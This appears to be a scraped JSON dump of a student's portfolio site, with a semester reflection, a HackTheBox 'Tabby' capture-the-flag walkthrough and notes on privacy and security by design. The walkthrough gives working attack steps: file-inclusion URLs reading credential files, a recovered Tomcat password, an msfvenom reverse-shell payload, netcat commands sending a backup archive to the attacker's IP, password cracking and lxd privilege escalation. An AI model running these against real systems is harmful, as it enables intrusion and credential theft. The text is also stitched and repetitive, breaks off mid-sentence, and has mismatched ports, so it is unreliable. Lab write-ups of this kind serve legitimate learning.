It is nice to hear that my groupmates think positively of me. I also see a improvement in my communication skills on a professional level. \n\n### Conclusion \n\nOverall, I have developed myself well this semester the feedback I received was generally very positive. there was a point of development for communication I worked on this and it is reflected in the reviews of my team members. Because of the alternating corona measures and consequences of working from home, it was sometimes difficult to switch. I did have trouble with that, but generally speaking the whole group did. Despite all this, it went well and we were able to deliver a nice product. \n\n### Professional writing\n\nFor the professional writing I chose to write my portfolio in English. Currently I am taking an English course to bring my English to a professional level so writing my portfolio in English is a very good exercise. I have also done different researches like the static research. This has also contributed to my professionalism so I have learned how to set up a hypothesis, do research and analyze the data. In the process I also learned how to draw a conclusion from the results as found in the research. \n\n### Ethical aspect. \n\nI have delved quite deeply into the ethical processes within the topics I cover. I have also done this for the group project. This has taught me how to approach certain things and what things cannot be done within the field and specialization. \n\n### Network\n\nDuring this minor I was actively searching graduating position in Software Engineering. For this I look some time to setup my LinkedIn profile. I have been in contact with multiple companies and chose one that took my interest. In doing so i expanded my social network on LinkedIn. I also developed the site you're looking at this during this minor. Within this site you can read about all the topic I covered. \n\n### Intercultural competence\n\nDuring this semester I followed an English C1 Cambridge course in the evening hours. The focus is mainly on cultural aspects and which words fit best in a situation to speak fluently and native. I also chose to write documentation in English this entire semester, and the workshops that were in English also contributed to this. \n\n## General Conslusion \n\nOverall, I think I learned a lot in this minor. In doing so, I placed my focus mainly on performing machine learning in the area of cyber. I had no prior knowledge of this topic. Now I have a broad scale of knowledge both technical and non technical aspects working on the group project and on the portfolio helped to improve my technical and non-technical and professional and innovations skills. I was happy in the way this minor was structured. It was very open minded I was free in learning about things of interest what I personally find very motivating. It was also allowed to combined different aspects within the cyber atmosphere. I did a lot of side projects that interested me I learned a lot about all of them and besides you really benefit if you are free in what you want to learn because you only learn what you are interested in. Finally, I would like to conclude this minor by thanking all the teachers, especially Stefan and Peter, for their great guidance. \n\nI will evetually graduate in the field of software-engineering, but all the knowledge I have gained during this minor is very valuable.","readingTime":"15 min read","meta":{"version":0,"revision":0,"created":1642431877120},"$loki":10},{"slug":"minor_own-a-linux-machine","description":"Own a Linux machine","title":"Own a Linux machine","duration":"2 days","image":"/images/projects/minor/osint/main.png","tech":[{"name":"pentest"},{"name":"red-hat"}],"category":[{"name":"minor"},{"name":"cyber"},{"name":"body of knowledge"}],"author":{"name":"Rik Peeters","image":"/images/me.jpg","social":{"twitter":"rikp777"}},"createdAt":"2022-01-10T00:00:00.000Z","toc":[{"id":"create-reverse-shell","depth":3,"text":"Create Reverse Shell"},{"id":"upload-reverse-shell","depth":3,"text":"Upload Reverse Shell"},{"id":"start-netcat-listener","depth":3,"text":"Start Netcat Listener"},{"id":"zip2john","depth":3,"text":"zip2john"},{"id":"john","depth":3,"text":"John"}],"body":{"type":"root","children":[{"type":"element","tag":"h1","props":{"id":"own-a-linux-machine"},"children":[{"type":"element","tag":"a","props":{"href":"#own-a-linux-machine","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"Own a Linux machine"}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Because I use a Linux operating system 'arch' daily.

I"}]}]},"text":"\n# Own a Linux machine\n\nBecause I use a Linux operating system 'arch' daily. I was wondering how safe I really am on my Linux system when I don't update my packages regular. In this topic I will show my walkthrough of hacking the system named [Tabby](https://www.hackthebox.com/home/machines/profile/259). The machines host IP is 10.10.10.194. The machines difficulty level is set to be low, but then again I'm pretty new at hacking a linux system. First I connected via the VPN and tested the connection by pinging the IP given. \n\nI first started by scanning all the ports on the machine. This I did by running the following command: nmap -sV -sC -Pn scan 10.10.10.194\n\n<a href=\"/images/projects/minor/nmap.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/nmap.png\" alt=\"nmap\"/>\n</a>\n\nNmap show that there are a couple of services running with there operating port. We see that port 22 and 80 are open. We see the service name and the version name. \n\n| Port     | State | Service | Version                                             |\n| -------- | ----- | ------- | --------------------------------------------------- |\n| 22/tcp   | open  | ssh     | OpenSSH 8.2p1 Ununtu 4 (Ubuntu Linux; protocol 2.0) |\n| 80/tcp   | open  | http    | Apache httpd 2.4.41 ((Ubuntu))                      |\n| 8080/tcp | open  | http    | Apache Tomcat                                       |\n\nSo out this table we can conclude that a Apache web server is running on port 80. When we visit the IP with the given port in a browser we get to see the follow site.\n\n<a href=\"/images/projects/minor/webpage.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/webpage.png\" alt=\"webpage\"/>\n</a>\n\nMost of the links on the page are dead, after some enumeration on the webpage I found a url which is redirecting to the http://megahosting.htb/news.php?file=statement. So I replaced megahosting.htb with my ip and even added megahosting.htb to /etc/hosts. The site is the same, but now the links work. After visiting that site I found that the webpage is vulnerable to Local File Inclusion. It can be confirmed by this URL\n\nview-source:http://10.10.10.194/news.php?file=../../../../../etc/passwd \n\n<a href=\"/images/projects/minor/loaded-page.webp\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/loaded-page.webp\" alt=\"webpage\"/>\n</a>\n\nBut we also have port 8080 that is running Apache Tomcat by visiting this port in our browser we get the following:\n\n<a href=\"/images/projects/minor/tomcat-page.webp\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/tomcat-page.webp\" alt=\"webpage\"/>\n</a>\n\nIn this page there are a couple of useful links. It gives us links to the manager webapp and the host-manager webapp. After some research we know that tomcat users are stored in the following directory file etc/tomcat9/tomcat-users.xml or by locate tomcat-users.xml.\n\n/etc/tomcat9/tomcat-users.xml\n/usr/share/tomcat9/etc/tomcat-users.xml\n/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml\n\nAfter that we can use our file inclusion by \n\nview-source: http://10.10.10.194/news.php?file=../../../../etc/tomcat9/tomcat-users.xml \n\nBut nothing shows up. I got to know that configuration files are saved in usr/share. Searching more i tried the URL \n\nview-source: http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml\n\n<a href=\"/images/projects/minor/tomcat-password.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/tomcat-password.png\" alt=\"webpage\"/>\n</a>\n\nSo the username and password for tomcat host-manager is tomcat :\n\nUsername = tomcat\nPassword = $3cureP4s5w0rd123!\nRoles = admin-gui, manager-script\n\nLet’s login with these credentials and enumerate the gui-panel.\n\n<a href=\"/images/projects/minor/host-manager.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/host-manager.png\" alt=\"webpage\"/>\n</a>\n\nI never worked in this panel so I had to watch some documentation first to understand it. I couldnt really do anything so in the documentation I found there was an api.\n\n\n\nWe can still deploy the `.war` file via `curl`. First, let’s make a reverse shell payload with `msfvenom`:\n\n### Create Reverse Shell\n\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war > my_reverse_shell.war\n\nThen, using `curl`, deploy the payload:\n\n### Upload Reverse Shell\n\ncurl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file my_reverse_shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/my_reverse_shell'\n\nOnce deployed, by accessing the URL on a browser, we can trigger the payload to call back to our listener.\n\n### Start Netcat Listener\n\nnc -nvlp 1234\n\n<a href=\"/images/projects/minor/reverse-shell.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/reverse-shell.png\" alt=\"webpage\"/>\n</a>\n\nFurther enumeration found that there is a directory called `/var/www/html/files` which is owned by the user `ash`.\n\n```\nls -la\ntotal 48\ndrwxr-xr-x 4 root root  4096 Jun 17 16:24 .\ndrwxr-xr-x 3 root root  4096 May 21 10:31 ..\ndrwxr-xr-x 6 root root  4096 Mar 31  2016 assets\n-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico\ndrwxr-xr-x 4 ash  ash   4096 Jun 17 21:59 files \n-rw-r--r-- 1 root root 14175 Jun 17 16:24 index.php\n-rw-r--r-- 1 root root  2894 May 21 11:42 logo.png\n-rw-r--r-- 1 root root   123 Jun 16 11:19 news.php\n-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt \n```\n\nWithin the files directory, there is an backup zip file.\n\n```\nls -la\ntotal 36\ndrwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .\ndrwxr-xr-x 4 root root 4096 Jun 17 16:24 ..\n-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip\ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 archive \ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs \n-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement\n```\n\nAnd using the following \"netcat\" commands, we can download the .zip\" file to our Kali box:\n\n```\n# Kali Box\n$ nc -lvnp 80 > backup.zip\n\n# Tabby Box\n$ nc 10.10.14.3 80 < 16162020_backup.zip\n```\n\n```\nunzip backup.zip \nArchive:  backup.zip\n\tcreating: var/www/html/assets/\n [backup.zip]  var/www/html/favicon.ico password:\n password incorrect--reenter:\n \tskipping: var/www/html/favicon.ico  incorrect password\n \tcreating: var/www/html/files/\n \tskipping: var/www/html/index.php  incorrect password\n \tskipping: var/www/html/logo.png   incorrect password \n \tskipping: var/www/html/news.php   incorrect password\n \tskipping: var/www/html/Readme.txt  incorrect password \n```\n\nWe can use \"zip2john\" and \"john\" to potentially crack the password\n\n### zip2john\nzip2john backup.zip > bkcup-prep.zip\n\n### John \njohn --wordlist=/usr/share/wordlists/rockyou.txt bakcup-prep.zip\n\n```\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nadmin@it \t\t(backup.zip)\n1g 0:00:00:02 DONE (2022-01-10) 0.3759g/s 3895Kp/s 3895Kc/s 3895KC/s adnc153..adenabuck\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession compledted\n```\n\nAnd it cracked the password as \"admin@it\"\n\n```\ntomcat@tabby: /var/www/html/files$ su ash\nsu ash\nPassword: admin@it\n\nash@tabby:/var/www/html/files$ id\nuid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\n\nash@tabby:/var/www/html/files$ cat /home/ash/user.txt\ncat /home/ash/user.txt\ne43c28adc365eca134046f4217125178\n\nash@tabby:/var/www/html/files$\n```\n\nNow we have user access \n\n# Root privilege \n\nFrom the above result, we can see that \"ash\" is member of the \"lxd\" group.\n\nThe following links provide some great information into the `lxd` group and exploiting it:\n\n- https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/\n- https://www.hackingarticles.in/lxd-privilege-escalation/\n\nA member of the local \"lxd\" group can effectively escalate the privileges on the host operating system to root in an instant.

This is because LXD is a root process that performs activities for anybody with write access to the LXD UNIX socket, and it frequently ignores the calling user's rights.\n\nWe'll need the alpine-builder package to take use of this. I used git clone to obtain the package: git clone https://github.com/saghul/lxd-alpine-builder.git and then transferred it to the tabby host using a python web server hosted on my kali machine.

I was wondering how safe I really am on my Linux system when I don't update my packages regular. In this topic I will show my walkthrough of hacking the system named [Tabby](https://www.hackthebox.com/home/machines/profile/259). The machines host IP is 10.10.10.194. The machines difficulty level is set to be low, but then again I'm pretty new at hacking a linux system. First I connected via the VPN and tested the connection by pinging the IP given. \n\nI first started by scanning all the ports on the machine. This I did by running the following command: nmap -sV -sC -Pn scan 10.10.10.194\n\n<a href=\"/images/projects/minor/nmap.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/nmap.png\" alt=\"nmap\"/>\n</a>\n\nNmap show that there are a couple of services running with there operating port. We see that port 22 and 80 are open. We see the service name and the version name. \n\n| Port     | State | Service | Version                                             |\n| -------- | ----- | ------- | --------------------------------------------------- |\n| 22/tcp   | open  | ssh     | OpenSSH 8.2p1 Ununtu 4 (Ubuntu Linux; protocol 2.0) |\n| 80/tcp   | open  | http    | Apache httpd 2.4.41 ((Ubuntu))                      |\n| 8080/tcp | open  | http    | Apache Tomcat                                       |\n\nSo out this table we can conclude that a Apache web server is running on port 80. When we visit the IP with the given port in a browser we get to see the follow site.\n\n<a href=\"/images/projects/minor/webpage.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/webpage.png\" alt=\"webpage\"/>\n</a>\n\nMost of the links on the page are dead, after some enumeration on the webpage I found a url which is redirecting to the http://megahosting.htb/news.php?file=statement. So I replaced megahosting.htb with my ip and even added megahosting.htb to /etc/hosts. The site is the same, but now the links work. After visiting that site I found that the webpage is vulnerable to Local File Inclusion. It can be confirmed by this URL\n\nview-source:http://10.10.10.194/news.php?file=../../../../../etc/passwd \n\n<a href=\"/images/projects/minor/loaded-page.webp\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/loaded-page.webp\" alt=\"webpage\"/>\n</a>\n\nBut we also have port 8080 that is running Apache Tomcat by visiting this port in our browser we get the following:\n\n<a href=\"/images/projects/minor/tomcat-page.webp\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/tomcat-page.webp\" alt=\"webpage\"/>\n</a>\n\nIn this page there are a couple of useful links. It gives us links to the manager webapp and the host-manager webapp. After some research we know that tomcat users are stored in the following directory file etc/tomcat9/tomcat-users.xml or by locate tomcat-users.xml.\n\n/etc/tomcat9/tomcat-users.xml\n/usr/share/tomcat9/etc/tomcat-users.xml\n/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml\n\nAfter that we can use our file inclusion by \n\nview-source: http://10.10.10.194/news.php?file=../../../../etc/tomcat9/tomcat-users.xml \n\nBut nothing shows up. I got to know that configuration files are saved in usr/share. Searching more i tried the URL \n\nview-source: http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml\n\n<a href=\"/images/projects/minor/tomcat-password.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/tomcat-password.png\" alt=\"webpage\"/>\n</a>\n\nSo the username and password for tomcat host-manager is tomcat :\n\nUsername = tomcat\nPassword = $3cureP4s5w0rd123!\nRoles = admin-gui, manager-script\n\nLet’s login with these credentials and enumerate the gui-panel.\n\n<a href=\"/images/projects/minor/host-manager.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/host-manager.png\" alt=\"webpage\"/>\n</a>\n\nI never worked in this panel so I had to watch some documentation first to understand it. I couldnt really do anything so in the documentation I found there was an api.\n\n\n\nWe can still deploy the `.war` file via `curl`. First, let’s make a reverse shell payload with `msfvenom`:\n\n### Create Reverse Shell\n\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war > my_reverse_shell.war\n\nThen, using `curl`, deploy the payload:\n\n### Upload Reverse Shell\n\ncurl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file my_reverse_shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/my_reverse_shell'\n\nOnce deployed, by accessing the URL on a browser, we can trigger the payload to call back to our listener.\n\n### Start Netcat Listener\n\nnc -nvlp 1234\n\n<a href=\"/images/projects/minor/reverse-shell.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/reverse-shell.png\" alt=\"webpage\"/>\n</a>\n\nFurther enumeration found that there is a directory called `/var/www/html/files` which is owned by the user `ash`.\n\n```\nls -la\ntotal 48\ndrwxr-xr-x 4 root root  4096 Jun 17 16:24 .\ndrwxr-xr-x 3 root root  4096 May 21 10:31 ..\ndrwxr-xr-x 6 root root  4096 Mar 31  2016 assets\n-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico\ndrwxr-xr-x 4 ash  ash   4096 Jun 17 21:59 files \n-rw-r--r-- 1 root root 14175 Jun 17 16:24 index.php\n-rw-r--r-- 1 root root  2894 May 21 11:42 logo.png\n-rw-r--r-- 1 root root   123 Jun 16 11:19 news.php\n-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt \n```\n\nWithin the files directory, there is an backup zip file.\n\n```\nls -la\ntotal 36\ndrwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .\ndrwxr-xr-x 4 root root 4096 Jun 17 16:24 ..\n-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip\ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 archive \ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs \n-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement\n```\n\nAnd using the following \"netcat\" commands, we can download the .zip\" file to our Kali box:\n\n```\n# Kali Box\n$ nc -lvnp 80 > backup.zip\n\n# Tabby Box\n$ nc 10.10.14.3 80 < 16162020_backup.zip\n```\n\n```\nunzip backup.zip \nArchive:  backup.zip\n\tcreating: var/www/html/assets/\n [backup.zip]  var/www/html/favicon.ico password:\n password incorrect--reenter:\n \tskipping: var/www/html/favicon.ico  incorrect password\n \tcreating: var/www/html/files/\n \tskipping: var/www/html/index.php  incorrect password\n \tskipping: var/www/html/logo.png   incorrect password \n \tskipping: var/www/html/news.php   incorrect password\n \tskipping: var/www/html/Readme.txt  incorrect password \n```\n\nWe can use \"zip2john\" and \"john\" to potentially crack the password\n\n### zip2john\nzip2john backup.zip > bkcup-prep.zip\n\n### John \njohn --wordlist=/usr/share/wordlists/rockyou.txt bakcup-prep.zip\n\n```\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nadmin@it \t\t(backup.zip)\n1g 0:00:00:02 DONE (2022-01-10) 0.3759g/s 3895Kp/s 3895Kc/s 3895KC/s adnc153..adenabuck\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession compledted\n```\n\nAnd it cracked the password as \"admin@it\"\n\n```\ntomcat@tabby: /var/www/html/files$ su ash\nsu ash\nPassword: admin@it\n\nash@tabby:/var/www/html/files$ id\nuid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\n\nash@tabby:/var/www/html/files$ cat /home/ash/user.txt\ncat /home/ash/user.txt\ne43c28adc365eca134046f4217125178\n\nash@tabby:/var/www/html/files$\n```\n\nNow we have user access \n\n# Root privilege \n\nFrom the above result, we can see that \"ash\" is member of the \"lxd\" group.\n\nThe following links provide some great information into the `lxd` group and exploiting it:\n\n- https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/\n- https://www.hackingarticles.in/lxd-privilege-escalation/\n\nA member of the local \"lxd\" group can effectively escalate the privileges on the host operating system to root in an instant. This is true whether or not the person has been granted sudo access, and it does not need them entering their password. Even with the LXD snap package, the vulnerability persists. This is because LXD is a root process that performs activities for anybody with write access to the LXD UNIX socket, and it frequently ignores the calling user's rights.\n\nWe'll need the alpine-builder package to take use of this. I used git clone to obtain the package: git clone https://github.com/saghul/lxd-alpine-builder.git and then transferred it to the tabby host using a python web server hosted on my kali machine. I was able to transfer it using curl -O from there. We needed to build it using the following commands after we had the alpine package on the host:\n\n````\ncd lxd-alpine-builder\nsudo ./build-alpine\n````\n\nFrom there, I needed to configure LXD, so I started the LXD initialization process with the \"lxd init\" comman.

The emphasis on privacy is maintained throughout the system's lifespan. The goal is to improve personal data security. This can already be accomplished by considering the necessity of storage: which data are truly required and which are not? Data must be considered throughout its entire life cycle, including storage, modification, and deletion. Organizational aspects, in addition to technical aspects, play a role.\n\nPrivacy by Design is often mentioned in the same breath as Privacy by Default. They are related concepts; Privacy by Default refers to the default settings of a program, website, service or device.\nPrivacy by Default and Privacy by Design are enshrined as concepts in Article 25 of the Algemene Verordening Gegevensbescherming (AVG).\n\n### Proactive not Reactive; Preventative not Remedial\n\nThe Privacy by Design approach is characterized by proactive rather than reactive measures. It anticipates and prevents privacy invasive events before they happen. PbD does not wait for privacy risks to materialize, nor does it offer remedies for resolving privacy infractions once they have occurred − it aims to prevent them from occurring. In short, Privacy by Design comes before-the-fact, not after.\n\n### Privacy as the Default\n\nWe can all be certain of one thing − the default rules! Privacy by Design seeks to deliver the maximum degree of privacy by ensuring that personal data are automatically protected in any given IT system or business practice. If an individual does nothing, their privacy still remains intact. No action is required on the part of the individual to protect their privacy − it is built into the system, by default.\n\n### Privacy Embedded into Design\n\nPrivacy by Design is embedded into the design and architecture of IT systems and business practices. It is not bolted on as an add-on, after the fact. The result is that privacy becomes an essential component of the core functionality being delivered. Privacy is integral to the system, without diminishing functionality\n\n### Full Functionality – Positive-Sum, not Zero-Sum\n\nPrivacy by Design seeks to accommodate all legitimate interests and objectives in a positive-sum “winwin” manner, not through a dated, zero-sum approach, where unnecessary trade-offs are made. Privacy by Design avoids the pretence of false dichotomies, such as privacy vs. security, demonstrating that it is possible, and far more desirable, to have both.\n\n### End-to-End Security – Lifecycle Protection\n\nPrivacy by Design, having been embedded into the system prior to the first element of information being collected, extends securely throughout the entire lifecycle of the data involved — strong security measures are essential to privacy, from start to finish. This ensures that all data are securely retained, and then securely destroyed at the end of the process, in a timely fashion. Thus, Privacy by Design ensures cradle to grave, secure lifecycle management of information, end-to-end.\n\n### Visibility and Transparency\n\nPrivacy by Design seeks to assure all stakeholders that whatever the business practice or technology involved, it is in fact, operating according to the stated promises and objectives, subject to independent verification. Its component parts and operations remain visible and transparent, to both users and providers alike. Remember, trust but verify!\n\n### Respect for User Privacy\n\nAbove all, Privacy by Design requires architects and operators to keep the interests of the individual uppermost by offering such measures as strong privacy defaults, appropriate notice, and empowering user-friendly options. Keep it user-centric!\n\n### Certification mechanism \n\nThe Personal Data Authority or a national accreditation body may accredit a certification body, to provide certificate showing that a controller or processor is operating in compliance with the AVG. This makes it clear to the user that his data is being handled securely. \n\n## Security by design \n\nSecurity should be a top priority for your developers as they implement your product's requirements at every stage of the software development life cycle (SDLC). We'll look at how to construct a secure SDLC in this article, so you can catch errors in requirements before they become security issues in production.\n\nSoftware Development Lifecycle (SDLC) describes how software applications are built. It usually contains the following phases: \n\n### Requirements \n\nThe requirements for new features are gathered from many stakeholders during this early stage. It's critical to identify any security concerns when gathering functional requirements for the new release.\n\n### Design\n\nThis phase turns in-scope requirements into a plan for how the application should be implemented. Functional requirements define what should happen, whereas security requirements indicate what should not happen.\n\n### Development \n\nWhen it comes to putting the idea into action and making it a reality, the focus frequently shifts to ensuring that the code is well-written from a security standpoint. Secure coding guidelines are usually created, as are code reviews to ensure that these guidelines have been followed appropriately. These code reviews can be done manually or automatically using tools like static application security testing (SAST).\n\n### Verification \n\nThe Verification step involves a thorough testing cycle to ensure that applications meet the original design and requirements. This is also an excellent opportunity to implement automated security testing, which can be done using a variety of technologies. Unless these tests pass, the application will not be deployed. To control verification and release, this phase frequently involves automated techniques like as CI/CD pipelines.\n\n### Maintenance and evolution \n\nThe story doesn't finish when the app is launched. In reality, security flaws that slipped through the holes in the application may be discovered decades after it has been deployed. These flaws can be detected in the code that developers authored, but they're also becoming more common in the underlying open-source components that make up an application. As a result, the number of \"zero-days\" vulnerabilities that were previously undiscovered but were discovered in production by the application's maintainers increases.\n\n## Secure Development Lifecycle (SDL)\n\nIn its simplest form, the SDL is a process that standardizes security best practices across a range of products and/or applications. It captures industry-standard security activities, packaging them so they may be easily implemented. The software development lifecycle consists of several phases, which I will explain in more detail below.\n\n### The problems the SDL solves\n\nThe lack of a standard approach to securing products causes problems. For one thing, vulnerabilities run rampant in shipped products. The triage and response needed to deal with this are major resource sinks. As a result, developers spend too much time fixing code they wrote in the past and not enough focusing on the future.\n\nThe second problem is that developers tend to repeat the same security mistakes, each time expecting a different response (which is the definition of insanity). The third issue is that problems are found at release or after deployment, beyond the reasonable time when the problems could be mitigated in an inexpensive manner.\n\nFinally, without a security standard customers have no assurance that a given product is secure. A single product considered for purchase may be one of the good ones, or it might be terrible from a security perspective. Without an SDL, there is no product security parity across the company. And without a standard process, some product teams ignore security altogether.\n\n**Benefits of SDL**\n\nThe most important reasons to adopt SDL practices are:\n\n1. Higher security: In SDL, continuous monitoring for vulnerabilities results in better application quality and mitigation of business risks.\n2. Cost reduction: In SDL, early attention to flaws significantly reduces the effort required to detect and fix them.\n3. Regulatory compliance: SDL encourages a conscientious attitude toward security-related laws and regulations. Ignoring them may result in fines and penalties, even if no sensitive data is lost.\n4. Development teams get continuous training in secure coding practices.\n5. Security approaches become more consistent across teams.\n6. Customers trust the team more, because they see that special attention is paid to their security.\n7. Internal security improves when SDL is applied to in-house software tools.\n\n## In practice\n\nCommonly, secure programming improvement lifecycle measures are separated into the accompanying stages:\n\n###\tConcept and planning\n\nThis stage is used to define the application concept and analyze its suitability. This includes creating a task plan, writing project requirements, and assigning HR.\n\n### Architecture and design\n\nThis stage is used to plan an item that fits the requirements. This includes displaying the application's structure and usage scenarios, as well as identifying external components that can help speed up development.

This includes running automated and manual tests, identifying problems, and resolving them.\n\n### Release and maintenance\n\nAn application goes live at this time, with multiple samples running in a variety of scenarios. Finally, new forms and fixes become available, and some clients opt to redesign while others stick with the more established options.\n\n### End of life\n\nThe term \"end of life\" refers to when a product's developer stops supporting it. Applications that store sensitive data may be subject to strict end-of-life guidelines.\n","dir":"/projects/minor","path":"/projects/minor/privacy","extension":".md","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"\n# Methodologies and practices of secure development \n\n## Privacy by design \n\nWhen using the Privacy by Design principle, privacy is considered from the beginning of the design of an information system.

It's critical to identify any security concerns when gathering functional requirements for the new release.\n\n### Design\n\nThis phase turns in-scope requirements into a plan for how the application should be implemented.

It captures industry-standard security activities, packaging them so they may be easily implemented. The software development lifecycle consists of several phases, which I will explain in more detail below.\n\n### The problems the SDL solves\n\nThe lack of a standard approach to securing products causes problems. For one thing, vulnerabilities run rampant in shipped products. The triage and response needed to deal with this are major resource sinks. As a result, developers spend too much time fixing code they wrote in the past and not enough focusing on the future.\n\nThe second problem is that developers tend to repeat the same security mistakes, each time expecting a different response (which is the definition of insanity).

A single product considered for purchase may be one of the good ones, or it might be terrible from a security perspective. Without an SDL, there is no product security parity across the company. And without a standard process, some product teams ignore security altogether.\n\n**Benefits of SDL**\n\nThe most important reasons to adopt SDL practices are:\n\n1. Higher security: In SDL, continuous monitoring for vulnerabilities results in better application quality and mitigation of business risks.\n2. Cost reduction: In SDL, early attention to flaws significantly reduces the effort required to detect and fix them.\n3. Regulatory compliance: SDL encourages a conscientious attitude toward security-related laws and regulations. Ignoring them may result in fines and penalties, even if no sensitive data is lost.\n4. Development teams get continuous training in secure coding practices.\n5. Security approaches become more consistent across teams.\n6. Customers trust the team more, because they see that special attention is paid to their security.\n7. Internal security improves when SDL is applied to in-house software tools.\n\n## In practice\n\nCommonly, secure programming improvement lifecycle measures are separated into the accompanying stages:\n\n###\tConcept and planning\n\nThis stage is used to define the application concept and analyze its suitability.

Finally, new forms and fixes become available, and some clients opt to redesign while others stick with the more established options.\n\n### End of life\n\nThe term \"end of life\" refers to when a product's developer stops supporting it.

We'll look at how to construct a secure SDLC in this article, so you can catch errors in requirements before they become security issues in production.\n\nSoftware Development Lifecycle (SDLC) describes how software applications are built. It usually contains the following phases: \n\n### Requirements \n\nThe requirements for new features are gathered from many stakeholders during this early stage. It's critical to identify any security concerns when gathering functional requirements for the new release.\n\n### Design\n\nThis phase turns in-scope requirements into a plan for how the application should be implemented. Functional requirements define what should happen, whereas security requirements indicate what should not happen.\n\n### Development \n\nWhen it comes to putting the idea into action and making it a reality, the focus frequently shifts to ensuring that the code is well-written from a security standpoint. Secure coding guidelines are usually created, as are code reviews to ensure that these guidelines have been followed appropriately. These code reviews can be done manually or automatically using tools like static application security testing (SAST).\n\n### Verification \n\nThe Verification step involves a thorough testing cycle to ensure that applications meet the original design and requirements. This is also an excellent opportunity to implement automated security testing, which can be done using a variety of technologies. Unless these tests pass, the application will not be deployed. To control verification and release, this phase frequently involves automated techniques like as CI/CD pipelines.\n\n### Maintenance and evolution \n\nThe story doesn't finish when the app is launched. In reality, security flaws that slipped through the holes in the application may be discovered decades after it has been deployed. These flaws can be detected in the code that developers authored, but they're also becoming more common in the underlying open-source components that make up an application. As a result, the number of \"zero-days\" vulnerabilities that were previously undiscovered but were discovered in production by the application's maintainers increases.\n\n## Secure Development Lifecycle (SDL)\n\nIn its simplest form, the SDL is a process that standardizes security best practices across a range of products and/or applications. It captures industry-standard security activities, packaging them so they may be easily implemented. The software development lifecycle consists of several phases, which I will explain in more detail below.\n\n### The problems the SDL solves\n\nThe lack of a standard approach to securing products causes problems. For one thing, vulnerabilities run rampant in shipped products. The triage and response needed to deal with this are major resource sinks. As a result, developers spend too much time fixing code they wrote in the past and not enough focusing on the future.\n\nThe second problem is that developers tend to repeat the same security mistakes, each time expecting a different response (which is the definition of insanity). The third issue is that problems are found at release or after deployment, beyond the reasonable time when the problems could be mitigated in an inexpensive manner.\n\nFinally, without a security standard customers have no assurance that a given product is secure. A single product considered for purchase may be one of the good ones, or it might be terrible from a security perspective. Without an SDL, there is no product security parity across the company. And without a standard process, some product teams ignore security altogether.\n\n**Benefits of SDL**\n\nThe most important reasons to adopt SDL practices are:\n\n1. Higher security: In SDL, continuous monitoring for vulnerabilities results in better application quality and mitigation of business risks.\n2. Cost reduction: In SDL, early attention to flaws significantly reduces the effort required to detect and fix them.\n3. Regulatory compliance: SDL encourages a conscientious attitude toward security-related laws and regulations. Ignoring them may result in fines and penalties, even if no sensitive data is lost.\n4. Development teams get continuous training in secure coding practices.\n5. Security approaches become more consistent across teams.\n6. Customers trust the team more, because 